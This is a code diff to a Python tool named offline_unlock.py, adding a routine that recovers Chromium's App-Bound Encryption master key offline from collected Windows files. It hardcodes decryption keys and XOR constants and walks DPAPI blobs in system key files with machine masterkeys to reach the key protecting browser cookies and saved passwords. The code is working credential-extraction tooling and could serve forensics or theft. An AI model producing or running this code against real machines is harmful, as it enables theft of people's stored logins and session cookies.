@@ -19,9 +19,11 @@ usage: offline_unlock.py --bundle <dir-or-bundle.bin> [--psk-file server/psk.txt
 import argparse
 import base64
 import glob
+import io
 import json
 import os
 import re
+import struct
 import subprocess
 import sys
 import tempfile
@@ -53,6 +55,64 @@ def load_masterkey_file(path, key):
     off = len(mf.getData())
     mk = MasterKey(raw[off:off + mf["MasterKeyLen"]])
     return mk.decrypt(key)  # returns 64-byte decrypted masterkey
+
+
+CNG_ENTROPY = b"xT5rZW5qVVbrvpuA\x00"   # universal MS CNG key-blob entropy
+FLAG1_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+FLAG3_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+FLAG4_XOR = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
+KDBM_HDR = 12   # "KDBM" + version + length precede the 32-byte key material
+
+
+def derive_v20_from_ksp(inner, machine_mk, parts_dir):
+    """flag-4 offline chain: KSP file -> CNG key -> CBC -> XOR -> GCM.
+    inner = user-DPAPI-decrypted ABE plaintext (needs live session or
+    recorded bytes). Returns the 32-byte v20 master key."""
+    import glob
+    import re as _re
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    r = io.BytesIO(inner)
+    hlen = struct.unpack("<I", r.read(4))[0]
+    r.read(hlen)
+    struct.unpack("<I", r.read(4))
+    flag = r.read(1)[0]
+    if flag in (1, 2):
+        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+        iv, ct, tag = r.read(12), r.read(32), r.read(16)
+        if flag == 1:
+            return AESGCM(FLAG1_KEY).decrypt(iv, ct + tag, None)
+        return ChaCha20Poly1305(bytes.fromhex(
+            "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
+        )).decrypt(iv, ct + tag, None)
+    if flag not in (3, 4):
+        raise ValueError("unsupported flag %d" % flag)
+    enc_key, iv, ct, tag = r.read(32), r.read(12), r.read(32), r.read(16)
+    # find the KSP file whose DPAPI blob decrypts (last blob in file)
+    MAGIC = b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf"
+    cands = glob.glob(os.path.join(parts_dir, "win_systemkeys_*")) + \
+        glob.glob(os.path.join(parts_dir, "win:mprotect_*"))
+    for path in cands:
+        base = os.path.basename(path)
+        if any(x in base for x in (".log", ".LOG", ".TM", ".blf", "regtrans", "Preferred", "Diagnostic")):
+            continue
+        try:
+            raw = open(path, "rb").read()
+        except Exception:
+            continue
+        for off in [m.start() for m in _re.finditer(_re.escape(MAGIC), raw)][::-1]:
+            for mk in machine_mk:
+                try:
+                    clear = dpapi_blob_decrypt(raw[off:], mk, CNG_ENTROPY)
+                except Exception:
+                    continue
+                if clear and clear[:4] == b"KDBM":
+                    ksp_key = clear[KDBM_HDR:KDBM_HDR + 32]
+                    stage1 = Cipher(algorithms.AES(ksp_key),
+                                    modes.CBC(b"\x00" * 16)).decryptor().update(enc_key)
+                    xor = FLAG3_XOR if flag == 3 else FLAG4_XOR
+                    stage2 = bytes(a ^ b for a, b in zip(stage1, xor))
+                    return AESGCM(stage2).decrypt(iv, ct + tag, None)
+    return None
 
 
 def gcm_decrypt_v10(key, blob):
